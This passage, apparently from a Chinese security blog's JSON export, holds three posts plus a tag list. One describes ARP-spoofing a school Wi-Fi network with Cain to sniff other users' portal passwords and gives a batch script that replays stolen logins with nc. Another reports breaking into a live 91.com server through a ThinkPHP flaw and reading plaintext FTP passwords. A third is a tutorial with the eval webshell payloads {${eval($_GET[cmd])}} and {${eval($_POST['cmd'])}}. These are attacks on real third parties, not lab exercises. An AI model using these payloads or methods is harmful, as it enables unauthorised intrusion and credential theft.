9%A1%B5%E9%9D%A2%E8%AE%A4%E8%AF%81%EF%BC%8C%E6%97%A0%E9%A1%BB%E4%B8%8B%E8%BD%BD%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%A4%E8%AF%81%E8%BD%AF%E4%BB%B6%3C%2Fp%3E%0D%0A%3Cp%3E%3C%2Fp%3E%0D%0A%3C%2Fdiv%3E%0D%0A%3Cdiv+style%3D%22margin-left%3A+15px%3B+margin-right%3A+15px%22%3E%0D%0A%3Cdiv%3E%0D%0A%3Cul%3E%0D%0A++++%3Cli%3E%E5%9C%A8%E8%BF%9B%E8%A1%8CWeb%E8%AE%A4%E8%AF%81%E4%B9%8B%E5%89%8D%EF%BC%8C%E5%BB%BA%E8%AE%AE%E5%85%88%E5%85%B3%E9%97%AD%E5%90%8E%E5%8F%B0%E7%9A%84%E5%BA%94%E7%94%A8%E8%BD%AF%E4%BB%B6%EF%BC%8C%E5%A6%82FTP%E3%80%81MSN%E7%AD%89%E7%AD%89%3C%2Fli%3E%0D%0A++++%3Cli%3E%E5%A6%82%E6%9E%9C%E5%87%BA%E7%8E%B0%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E5%88%B0%E8%AE%A4%E8%AF%81%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E5%85%88%E5%85%B3%E9%97%AD%E5%90%8E%E5%8F%B0%E7%9A%84%E5%BA%94%E7%94%A8%E8%BD%AF%E4%BB%B6%EF%BC%8C%E5%86%8D%E9%87%8D%E6%96%B0%E6%89%93%E5%BC%80%E6%B5%8F%E8%A7%88%E5%99%A8%3C%2Fli%3E%0D%0A++++%3Cli%3E%E5%A6%82%E6%9E%9C%E8%A6%81%E4%B8%8B%E7%BA%BF%EF%BC%8C%E8%AF%B7%E7%82%B9%E5%87%BB%E4%B8%8B%E7%BA%BF%E6%8C%89%E9%92%AE%EF%BC%8C%E7%84%B6%E5%90%8E%E5%86%8D%E5%85%B3%E9%97%AD%E6%B5%8F%E8%A7%88%E5%99%A8%E7%AA%97%E5%8F%A3%3C%2Fli%3E%0D%0A++++%3Cli%3E%E8%AE%A4%E8%AF%81%E6%88%90%E5%8A%9F%E5%90%8E%EF%BC%8C%E4%BC%9A%E6%9C%89%E6%A0%87%E9%A2%98%E4%B8%BA%E2%80%9CWeb%E8%AE%A4%E8%AF%81%E4%B8%8B%E7%BA%BF%E9%A1%B5%E9%9D%A2+%E8%AF%B7%E4%B8%8D%E8%A6%81%E5%85%B3%E9%97%AD%E8%AF%A5%E9%A1%B5%E9%9D%A2%E2%80%9D%E7%9A%84%E7%AA%97%E5%8F%A3%E5%BC%B9%E5%87%BA%EF%BC%8C%E8%AE%B0%E5%BD%95%E6%82%A8%E4%B8%8A%E7%BD%91%E7%9A%84%E4%BF%A1%E6%81%AF%EF%BC%9B%E5%A6%82%E6%9E%9C%E6%B2%A1%E6%9C%89%E5%BC%B9%E5%87%BA%EF%BC%8C%E8%AF%B7%E6%A3%80%E6%9F%A5%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%BE%E7%BD%AE%EF%BC%8C%E5%85%B3%E9%97%AD%E5%BC%B9%E5%87%BA%E7%AA%97%E5%8F%A3%E6%8B%A6%E6%88%AA%E5%B7%A5%E5%85%B7%E3%80%82%3C%2Fli%3E%0D%0A%3C%2Ful%3E%0D%0A%3C%2Fdiv%3E%0D%0A%3Cul%3E%0D%0A++++%3Cli%3EBefore+carrying+out+Web+authentication+is+recommended+that+you+turn+off+background+applications%2C+such+as+FTP%2C+MSN%2C+etc.%3C%2Fli%3E%0D%0A++++%3Cli%3EIf+unable+to+connect+to+the+authentication+page%2C+it+is+recommended+to+close+the+back-end+application+software%2C+and+then+re-open+the+browser.%3C%2Fli%3E%0D%0A++++%3Cli%3EIf+you+want+offline%2C+please+click+the+offline+button%2C+and+then+close+the+browser+window.%3C%2Fli%3E%0D%0A++++%3Cli%3EAuthentication+is+successful%2C+there+will+be+titled+%22Web+authentication+page+off+the+assembly+line%2C+do+not+close+the+page%22+window+pops+up%2C+record+your+Internet+access+information%3B+If+there+are+no+pop-up%2C+please+check+your+browser+settings%2C+close+the+pop-up+blocker+tool.%3C%2Fli%3E%0D%0A%3C%2Ful%3E%0D%0A%3C%2Fdiv%3E%0D%0A%3Cp%3E%C2%A0%3C%2Fp%3E\n```\n\n按照打探得的消息，整个数据包有用的参数只有mac、username、usernameHidden、pwd，其他的大致都是与无线路由什么的有关。最后那段\n\n长长的参数是url编码的数据，在成功联网后还蛋疼的decode了下，反正不是什么重要的信息。\n\n准备工作做好了，那就开嗅吧。\n\n因为尝试多次发现usernameHidden与username的值是相等的，且mac的值可以在嗅探器的url一栏里看到，所以打开cain，找到HTTP Fields，\n\n在username field里只留下username，password field里只留下pwd。在cain中调到arp欺骗这一项，选几个顺眼的ip，开始等密码。不一会就得\n\n到了好几组密码。\n\n最开始以为无线网卡的mac地址必须改成与账号所对应的mac一样，但是苦于抓到包的参数中mac一项是经过加密的，貌似是MD5加密。但是拿着\n\n自己的mac，猜了几种不同的形式，本地计算MD5，但都与数据包中的值不同。后来想了想，即使我猜对了mac的形式，我也不可能逆出mac啊…\n\n没办法，硬着头皮把自己包中的mac、username、usernameHidden、pwd修改成嗅探得到的用户名密码以及mac部分的值，用brup发出去。\n\n上百度测试一下，唔，成功连上了~\n\n嗅探真是一个可怕的东东啊~\n\n按照原理的话，对于web验证的wifi，只要登陆页面不是https加密的，我们就可以用这种方法进行突破，用其他人的账户密码上网。\n\n总结：\n\n首先本地抓包查找数据包中的有用以及必要的信息，接下来嗅探得可以进行授权认证的信息，最后修改数据包发送至服务器完成验证。\n\n后记：\n\n实际中发现，这个验证不能用于多个人。即我蹭网之后，原主人的网就掉了。没办法，我只能抓了好几个人的密码之后挨个试了，希望原主人正好\n\n离开~\n\n嫌麻烦，写了个批处理，用nc发包。附上代码：\n\n```bat\n@echo off\nTitle Wifi蹭网 by delete\necho *******************************************************************************\necho Wifi蹭网免验证 by delete\necho *******************************************************************************\necho 请从以下学号中选择一个：\necho 1\\. Xxxxxx\necho 2\\. Xxxxxx\necho 3\\. Xxxxxx\necho 4\\. Xxxxxx\necho 5\\. Xxxxxx\necho 6\\. Xxxxxx\nset choice=\nset /p choice=请选择:\nif not &quot;%Choice%&quot;==&quot;&quot; set Choice=%Choice:~0,1%\nif /i &quot;%choice%&quot;==&quot;1&quot; goto st1\nif /i &quot;%choice%&quot;==&quot;2&quot; goto st2\nif /i &quot;%choice%&quot;==&quot;3&quot; goto st3\nif /i &quot;%choice%&quot;==&quot;4&quot; goto st4\nif /i &quot;%choice%&quot;==&quot;5&quot; goto st5\nif /i &quot;%choice%&quot;==&quot;6&quot; goto st6\n\n:st1\nnc -n xx.xx.xx.xx 80 &lt; ./data/st1.txt\ngoto end\n:st2\nnc -n xx.xx.xx.xx 80 &lt; ./data/st2.txt\ngoto end\n:st3\nnc -n xx.xx.xx.xx 80 &lt; ./data/st3.txt\ngoto end\n:st4\nnc -n xx.xx.xx.xx 80 &lt; ./data/st4.txt\ngoto end\n:st5\nnc -n xx.xx.xx.xx 80 &lt; ./data/st5.txt\ngoto end\n:st6\nnc -n xx.xx.xx.xx 80 &lt; ./data/st6.txt\ngoto end\n\n:end\n```\n\n用法是将nc.exe放在该bat脚本同一目录下，并新建data文件夹，存放有不同账户对应的数据包的信息的txt文件。具体的命名什么的看一下脚本就懂了。\n\n有个bug是运行到调用nc时，会卡在nc提交数据包得到返回的界面，不能自动结束。运行前还要先随便打开一个网页，以完成本机参数初始化…\n\n再后来，日下了与验证网页所在服务器同网段的一台服务器，装上cain怎么嗅都嗅不到，甚是郁闷。Arp欺骗那里显示half routing，没有一个full\n\nrouting。而嗅探其他的服务器却不是这样的。莫非装了牛b的防火墙？求大牛解答~\n\n还有一个更奇葩的问题，几天之后，当我再次想嗅探一下来获得更多的用户名密码的时候，开cain嗅探居然进行arp欺骗的时候劫持不到数据包，有\n\n点想不通了。\n最后废话一句，很多学校都已经支持ipv6了，我当前测试的无线路由是支持ipv6的。而登陆验证只限于ipv4，这样其实直接就能上ipv6的网的。网\n\n上有很多ipv6转ipv4的方法，其中一个是sixxs.org，我个人觉得最好的是Veno2这个软件。有机会有条件的话大家不妨百度下具体的方法试试~\n","slug":"非https协议web方式wifi认证突破","updated":1421659126000,"excerpt":"<p>转自：法客 deleter</p>\n<p>话说我是个游手好闲的人，趁着暑假四处游荡，投亲靠友。一日来到某校，看有wifi，如饥似渴的打算蹭个小网上上。做好字典破wpa，暴力破</p>\n<p>wep的准备了都，连上wifi就傻眼了，web认证…</p>\n<p>好吧，web认证。既然是web认证，少不了负责验证的服务器。经测试，随便输入一个网址后都会被重定向到A站的一个登陆页面。如果能做手</p>\n<p>脚的话只能在这个页面上搞了。</p>\n<p>know it then hack it。首先找到知情人士，得知开网要提前申请，并且此账户与mac绑定。这就给了我当头一棒。本来想着肯定有很多人密码</p>\n<p>和用户名是一样的，而用户名又是学号，这样写个脚本暴力破解一个一个猜过去就行了。这样的话仅靠猜弱口令来登陆的话是不可能了。</p>\n<p>既然输入网址能被重定向到一个页面，而且此页面所在的服务器是一个公网的ip，那么说，我肯定已经分配好ip了，仅差一个授权。</p>\n<p>既然我已经有了一个ip，我就可以对所在的网段进行嗅探，如果能嗅探到登陆信息说不定还有点门路呢。</p>\n<p>有了大致的思路，开工开工~</p>\n","_id":"647fmzb2anmrm4f2","comments":true,"layout":"post","photos":[],"link":""},{"title":"91手机助手某站点漏洞及利用","id":130,"date":1342701599000,"tags":["30vehvzhre36deh1","pmsbkc1uw8i1zgx8"],"categories":["ng1ki7p1v08zbwrz","3ew512opa4s8w18i","ynqi3ufxo1cdml3c"],"content":"<p>其实这个漏洞也是偶然发现的，最近项目中用到了ThinkPHP框架习惯性的想到</p>\n<p>了此框架的漏洞，那就顺便google了一下看看现在还有那些大点的站存在此漏洞</p>\n<p>结果91.com这个字眼吸引了我。google:intitle:系统错误 thinkphp 91</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/91_2.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/91_2.png\" alt=\"\" title=\"91_2\"></a></p>\n<p>那就顺手测试一下啊结果存在远程命令执行漏洞<br><a id=\"more\"></a><br>如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/91_1.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/91_1.png\" alt=\"\" title=\"91_1\"></a></p>\n<p>其实看到这个应该都知道该怎么利用了吧？ 直接后面接一句话{${eval($_POST[‘cmd’])}}</p>\n<p>拿刀连上看看：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/91_3.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/91_3.png\" alt=\"\" title=\"91_3\"></a></p>\n<p>可以看到已经连接上了</p>\n<p>看看能执行命令不：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/91_4.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/91_4.png\" alt=\"\" title=\"91_4\"></a></p>\n<p>可以看到desable_function 中应该没有禁止PHP执行系统命令，gcc完全可以使用，提取问题应该就不打了。</p>\n<p>看看ThinkPHP的配置文件：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/91_5.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/91_5.png\" alt=\"\" title=\"91_5\"></a></p>\n<p>可以看到里面竟然有ftp的明文密码。那么大家想想一下如果，不发分子拿到下载站点里面的权限</p>\n<p>把正常的手机应用程序替换成为带有后门的程序，那么又有多少人的隐私收到威胁？</p>\n<p>在此还是提醒管理员，如果应用到别人的框架，为了对大家负责人，请及时更新所采用框架的版本</p>\n<p>以保证用户信息的安全性。</p>\n","source":"_posts/91手机助手某站点漏洞及利用.md","raw":"title: \"91手机助手某站点漏洞及利用\"\nid: 130\ndate: 2012-07-19 20:39:59\ntags: \n- ThinkPHP远程\n- 渗透\ncategories: \n- 原创作品\n- 技术文章\n- 最新漏洞\n---\n\n其实这个漏洞也是偶然发现的，最近项目中用到了ThinkPHP框架习惯性的想到\n\n了此框架的漏洞，那就顺便google了一下看看现在还有那些大点的站存在此漏洞\n\n结果91.com这个字眼吸引了我。google:intitle:系统错误 thinkphp 91\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/91_2.png \"91_2\")](http://asset.creturn.com/asset/uploads/2012/07/91_2.png)\n\n那就顺手测试一下啊结果存在远程命令执行漏洞\n<!--more-->\n如图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/91_1.png \"91_1\")](http://asset.creturn.com/asset/uploads/2012/07/91_1.png)\n\n其实看到这个应该都知道该怎么利用了吧？ 直接后面接一句话{${eval($_POST['cmd'])}}\n\n拿刀连上看看：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/91_3.png \"91_3\")](http://asset.creturn.com/asset/uploads/2012/07/91_3.png)\n\n可以看到已经连接上了\n\n看看能执行命令不：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/91_4.png \"91_4\")](http://asset.creturn.com/asset/uploads/2012/07/91_4.png)\n\n可以看到desable_function 中应该没有禁止PHP执行系统命令，gcc完全可以使用，提取问题应该就不打了。\n\n看看ThinkPHP的配置文件：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/91_5.png \"91_5\")](http://asset.creturn.com/asset/uploads/2012/07/91_5.png)\n\n可以看到里面竟然有ftp的明文密码。那么大家想想一下如果，不发分子拿到下载站点里面的权限\n\n把正常的手机应用程序替换成为带有后门的程序，那么又有多少人的隐私收到威胁？\n\n在此还是提醒管理员，如果应用到别人的框架，为了对大家负责人，请及时更新所采用框架的版本\n\n以保证用户信息的安全性。\n","slug":"91手机助手某站点漏洞及利用","updated":1421659126000,"excerpt":"<p>其实这个漏洞也是偶然发现的，最近项目中用到了ThinkPHP框架习惯性的想到</p>\n<p>了此框架的漏洞，那就顺便google了一下看看现在还有那些大点的站存在此漏洞</p>\n<p>结果91.com这个字眼吸引了我。google:intitle:系统错误 thinkphp 91</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/91_2.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/91_2.png\" alt=\"\" title=\"91_2\"></a></p>\n<p>那就顺手测试一下啊结果存在远程命令执行漏洞<br>","_id":"3b7l025jo9oz6hnj","comments":true,"layout":"post","photos":[],"link":""},{"title":"ThinkPHP远程执行漏洞利用","id":109,"date":1341507370000,"tags":["u6y03x1oxjcfk27o"],"categories":["ng1ki7p1v08zbwrz","3ew512opa4s8w18i"],"content":"<p>睡前一篇文章已经成为习惯，今天就给大家展示一个thinkphp漏洞的利用，其实这个漏洞已经爆出来很久了。只不过很少有人发布这样的文章而已。</p>\n<p>先说下ThinkPHP的url规则,这个url规则是thinkPHP默认规则，当然也可以通过路由重写来实现各种你想要的效果。先看看ThinkPHP默认的规则：</p>\n<blockquote>\n<p><a href=\"http://www.creturn.com/index.php/news/view/1\" target=\"_blank\" rel=\"external\">http://www.creturn.com/index.php/news/view/1</a></p>\n</blockquote>\n<p>分析下这个url</p>\n<blockquote>\n<p><a href=\"http://www.creturn.com/index.php\" target=\"_blank\" rel=\"external\">http://www.creturn.com/index.php</a>  这个是入口</p>\n<p>/news/view/1  其中第一个参数news是指ThinkPHP中的模块，view指的是ThinkPHP中的方法，而后面的参数1则是参数。而漏洞恰巧出在对参数过滤不严格上面了。导致可以提交php方法上去远程执行。</p>\n</blockquote>\n<p>还是事例来进行演示：</p>\n<p>先找一个有thinkPHP漏洞的站点，具体怎么找就不说了。因为ThinkPHP在国内PHP框架中使用的还是比较广泛的，所以存在漏洞的站点，尤其很多大型站点都采用了ThinkPHP框架</p>\n<p>据我了解不少游戏官网就是用thinkPHP作为底层开发框架的。好了不废话了看图。</p>\n<p>在存在漏洞的页面中输入:www.creturn.com/index.php/fuck<br><a id=\"more\"></a><br>好吧，为什么是fuck？前面已经说了第一个参数是模块那么系统肯定找不到模块的，所以出错信息：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/think1.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/think1.png\" alt=\"\" title=\"think1\"></a></p>\n<p>可以看到是thinkPHP框架</p>\n<p>那么测试一下站点是否存在远程执行漏洞。</p>\n<p>注意你的参数不要远程执行命令不能直接卸载index.php 后面的两个参数，最少要是第三个，前面已经说了第一个参数是模块，第二个参数是是方法。而从第三个开始是参数，因为此漏洞就是对参数过滤不严格并且导致可执行远程命令</p>\n<p>找到一个这样的连接:</p>\n<blockquote>\n<p><a href=\"http://www.creturn.com/index.php/article/show/id/116\" target=\"_blank\" rel=\"external\">http://www.creturn.com/index.php/article/show/id/116</a></p>\n</blockquote>\n<p>很明显可以看到他id后面跟的一个116.用漏洞命令替换它看看是否存在漏洞</p>\n<p>远程执行命令参数{${PHP代码}}，替换后就是：</p>\n<blockquote>\n<p><a href=\"http://www.creturn.com/index.php/article/show/id/{${phpinfo()}}\" target=\"_blank\" rel=\"external\">http://www.creturn.com/index.php/article/show/id/{${phpinfo()}}</a>  加一个PHP的探针</p>\n</blockquote>\n<p>测试下看是否能够执行此命令：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/think2.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/think2.png\" alt=\"\" title=\"think2\"></a></p>\n<p>可以看到已经解析了。那么就证明此站点存在远程执行漏洞，那么我们可以直接写入菜刀的一句话：</p>\n<p>一句话命令：{${eval($_GET[cmd])}} 替换之前的命令然后用菜刀连接</p>\n<blockquote>\n<p>地址为：<a href=\"http://www.creturn.com/index.php/article/show/id/{${eval($_GET[cmd])}}\" target=\"_blank\" rel=\"external\">http://www.creturn.com/index.php/article/show/id/{${eval($_GET[cmd])}}</a></p>\n</blockquote>\n<p>菜刀连接看下效果：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/think3.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/think3.png\" alt=\"\" title=\"think3\"></a></p>\n<p>好吧，就到这里。上面的真实地址我都替换掉了，目的只是演示thinkPHP远程执行命令的方法。还有就是提醒各位使用thinkphp框架的朋友，开发完东西后记住把debug模式关掉要不然很容以就看出是thinkphp的框架。</p>\n","source":"_posts/ThinkPHP远程执行漏洞利用.md","raw":"title: \"ThinkPHP远程执行漏洞利用\"\nid: 109\ndate: 2012-07-06 00:56:10\ntags: \n- thinkPHP漏洞\ncategories: \n- 原创作品\n- 技术文章\n---\n\n睡前一篇文章已经成为习惯，今天就给大家展示一个thinkphp漏洞的利用，其实这个漏洞已经爆出来很久了。只不过很少有人发布这样的文章而已。\n\n先说下ThinkPHP的url规则,这个url规则是thinkPHP默认规则，当然也可以通过路由重写来实现各种你想要的效果。先看看ThinkPHP默认的规则：\n\n>http://www.creturn.com/index.php/news/view/1\n\n分析下这个url\n\n>http://www.creturn.com/index.php  这个是入口\n\n>/news/view/1  其中第一个参数news是指ThinkPHP中的模块，view指的是ThinkPHP中的方法，而后面的参数1则是参数。而漏洞恰巧出在对参数过滤不严格上面了。导致可以提交php方法上去远程执行。\n\n还是事例来进行演示：\n\n先找一个有thinkPHP漏洞的站点，具体怎么找就不说了。因为ThinkPHP在国内PHP框架中使用的还是比较广泛的，所以存在漏洞的站点，尤其很多大型站点都采用了ThinkPHP框架\n\n据我了解不少游戏官网就是用thinkPHP作为底层开发框架的。好了不废话了看图。\n\n在存在漏洞的页面中输入:www.creturn.com/index.php/fuck\n<!--more-->\n好吧，为什么是fuck？前面已经说了第一个参数是模块那么系统肯定找不到模块的，所以出错信息：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/think1.png \"think1\")](http://asset.creturn.com/asset/uploads/2012/07/think1.png)\n\n可以看到是thinkPHP框架\n\n那么测试一下站点是否存在远程执行漏洞。\n\n注意你的参数不要远程执行命令不能直接卸载index.php 后面的两个参数，最少要是第三个，前面已经说了第一个参数是模块，第二个参数是是方法。而从第三个开始是参数，因为此漏洞就是对参数过滤不严格并且导致可执行远程命令\n\n找到一个这样的连接:\n\n>http://www.creturn.com/index.php/article/show/id/116\n\n很明显可以看到他id后面跟的一个116.用漏洞命令替换它看看是否存在漏洞\n\n远程执行命令参数{${PHP代码}}，替换后就是：\n\n>http://www.creturn.com/index.php/article/show/id/{${phpinfo()}}  加一个PHP的探针\n\n测试下看是否能够执行此命令：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/think2.png \"think2\")](http://asset.creturn.com/asset/uploads/2012/07/think2.png)\n\n可以看到已经解析了。那么就证明此站点存在远程执行漏洞，那么我们可以直接写入菜刀的一句话：\n\n一句话命令：{${eval($_GET[cmd])}} 替换之前的命令然后用菜刀连接\n\n>地址为：http://www.creturn.com/index.php/article/show/id/{${eval($_GET[cmd])}}\n\n菜刀连接看下效果：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/think3.png \"think3\")](http://asset.creturn.com/asset/uploads/2012/07/think3.png)\n\n好吧，就到这里。上面的真实地址我都替换掉了，目的只是演示thinkPHP远程执行命令的方法。还有就是提醒各位使用thinkphp框架的朋友，开发完东西后记住把debug模式关掉要不然很容以就看出是thinkphp的框架。\n","slug":"ThinkPHP远程执行漏洞利用","updated":1421659126000,"excerpt":"<p>睡前一篇文章已经成为习惯，今天就给大家展示一个thinkphp漏洞的利用，其实这个漏洞已经爆出来很久了。只不过很少有人发布这样的文章而已。</p>\n<p>先说下ThinkPHP的url规则,这个url规则是thinkPHP默认规则，当然也可以通过路由重写来实现各种你想要的效果。先看看ThinkPHP默认的规则：</p>\n<blockquote>\n<p><a href=\"http://www.creturn.com/index.php/news/view/1\" target=\"_blank\" rel=\"external\">http://www.creturn.com/index.php/news/view/1</a></p>\n</blockquote>\n<p>分析下这个url</p>\n<blockquote>\n<p><a href=\"http://www.creturn.com/index.php\" target=\"_blank\" rel=\"external\">http://www.creturn.com/index.php</a>  这个是入口</p>\n<p>/news/view/1  其中第一个参数news是指ThinkPHP中的模块，view指的是ThinkPHP中的方法，而后面的参数1则是参数。而漏洞恰巧出在对参数过滤不严格上面了。导致可以提交php方法上去远程执行。</p>\n</blockquote>\n<p>还是事例来进行演示：</p>\n<p>先找一个有thinkPHP漏洞的站点，具体怎么找就不说了。因为ThinkPHP在国内PHP框架中使用的还是比较广泛的，所以存在漏洞的站点，尤其很多大型站点都采用了ThinkPHP框架</p>\n<p>据我了解不少游戏官网就是用thinkPHP作为底层开发框架的。好了不废话了看图。</p>\n<p>在存在漏洞的页面中输入:www.creturn.com/index.php/fuck<br>","_id":"pixtpbicp8vj19ag","comments":true,"layout":"post","photos":[],"link":""}],"Tag":[{"name":"alfred","_id":"69njqdariogx08ca","posts":["sxqmjnrcij35mwmq"]},{"name":"os x","_id":"xy7xe9zend2coaw0","posts":["sxqmjnrcij35mwmq"]},{"name":"php","_id":"6973km6kad7polie","posts":["sxqmjnrcij35mwmq","itwf5335siwcl67d"]},{"name":"workflow","_id":"s6hh2b1k04j4n0u3","posts":["sxqmjnrcij35mwmq"]},{"name":"Android","_id":"46j3s9p0yhksf8z6","posts":["u0k2wf7e2iqh7lfn"]},{"name":"xUtils","_id":"dcpcji0h6rz0w7s6","posts":["u0k2wf7e2iqh7lfn"]},{"name":"android","_id":"2p7ln21w7mspwye0","posts":["tabbnxi32od2dra1","jdfgtor0t0tojay5"]},{"name":"java","_id":"fa8uqsv4tw7xctcn","posts":["jdfgtor0t0tojay5"]},{"name":"打飞机","_id":"og3yhqb9k72g5laf","posts":["jdfgtor0t0tojay5"]},{"name":"arp欺骗","_id":"36asgcbg77ro47zm","posts":["td4f36ekolwmmdod"]},{"name":"linux arp欺骗","_id":"jkky4aubcnchozqa","posts":["td4f36ekolwmmdod"]},{"name":"armitage","_id":"cpfaxeok03mr6lu8","posts":["jmgnnj7ztqamyqzb"]},{"name":"Backtrack5","_id":"zrf9xfcmwp9expxl","posts":["jmgnnj7ztqamyqzb"]},{"name":"自动化攻击","_id":"8djsjm1510afbi6l","posts":["jmgnnj7ztqamyqzb"]},{"name":"图马","_id":"q76ywjwe13c2l140","posts":["q6fjjsvgcsa20yxc"]},{"name":"隐藏私密文件","_id":"docffg98dif5d9r0","posts":["q6fjjsvgcsa20yxc"]},{"name":"dedecms漏洞","_id":"ch1yl1a4oa8rmcdk","posts":["rof3jjexx9r8itzw"]},{"name":"注入漏洞","_id":"7oe5pwzvyvwy1unb","posts":["rof3jjexx9r8itzw"]},{"name":"easyui","_id":"9gveogxdiut3wbji","posts":["hvrqvqfvwq5yzxfl"]},{"name":"eclipse","_id":"nvprrcqtka2k07j1","posts":["345egf8bl9o7knw2"]},{"name":"Metasploit","_id":"a6nwzj3n2sbkwjjl","posts":["bq5t8krfd8jl8d7u"]},{"name":"Mysql","_id":"p7c36otjetkpkpka","posts":["bq5t8krfd8jl8d7u"]},{"name":"任意密码登录","_id":"v5r8zb3199qf7de8","posts":["bq5t8krfd8jl8d7u"]},{"name":"Nginx解析漏洞","_id":"4gxvmqbxfd4k4xct","posts":["w4tp4xrfslx871s6"]},{"name":"phpcsm2008漏洞","_id":"gifemktnf94ke7hd","posts":["s7xb1n9mhlkbqj3y"]},{"name":"phpcmsv9漏洞","_id":"qvyaixa0ffh607ss","posts":["mflbiwe8m84wugvk","fkot7nez588egus5","q3d5s2uxdoyeqik3"]},{"name":"webshell","_id":"jkk1hzi0kjnqyh4p","posts":["mflbiwe8m84wugvk","cmezltyaprjjc9f0","dzpwot7lhoo9y3v8","n99lwvy9ofhvb2py"]},{"name":"任意读取文件漏洞","_id":"qjs410ib2s97hdlo","posts":["fkot7nez588egus5"]},{"name":"python","_id":"a05ws7ypnelwdyuo","posts":["1mh71caugci7e1d6","q3d5s2uxdoyeqik3"]},{"name":"apache","_id":"ml6i63k0mlf18eyy","posts":["itwf5335siwcl67d"]},{"name":"ubuntu","_id":"ar6b10znzennvxrm","posts":["itwf5335siwcl67d"]},{"name":"Return","_id":"z1no7frvtpmvidzr","posts":["cmezltyaprjjc9f0"]},{"name":"入侵","_id":"wl75syl90izjzing","posts":["cmezltyaprjjc9f0"]},{"name":"渗透","_id":"pmsbkc1uw8i1zgx8","posts":["cmezltyaprjjc9f0","3b7l025jo9oz6hnj"]},{"name":"wordpress漏洞","_id":"x2oej1diwv58fip4","posts":["o25p37uy9qa4y6c8","n99lwvy9ofhvb2py"]},{"name":"window密码","_id":"tcais1x2iadfin93","posts":["9gbjb3jltxqiqn72"]},{"name":"爆破","_id":"w1ijt0t2396whe1q","posts":["9gbjb3jltxqiqn72","pr3nkmpsoqejchsa"]},{"name":"后门","_id":"2191ch4on5ok5nco","posts":["dzpwot7lhoo9y3v8","b17w8n7z7elp131c","n99lwvy9ofhvb2py","hixlhm95f2ftmfig"]},{"name":"淘宝客漏洞","_id":"9kgwqxdb0vysi0ew","posts":["wegkktr56305qmol"]},{"name":"互联网技术","_id":"zmi5pqkco8ukeg8a","posts":["096nlnncebstcqad"]},{"name":"钓鱼","_id":"1bxs8elni36scx8x","posts":["b17w8n7z7elp131c"]},{"name":"cain","_id":"kuzollxdus91bzni","posts":["647fmzb2anmrm4f2"]},{"name":"web wifi认证","_id":"mqgbzw1xghtp8w0m","posts":["647fmzb2anmrm4f2"]},{"name":"嗅探","_id":"wcb9o05ttsfhkasw","posts":["647fmzb2anmrm4f2"]},{"name":"ThinkPHP远程","_id":"30vehvzhre36deh1","posts":["3b7l025jo9oz6hnj"]},{"name":"thinkPHP漏洞","_id":"u6y03x1oxjcfk27o","posts":["pixtpbicp8vj19ag"]}]}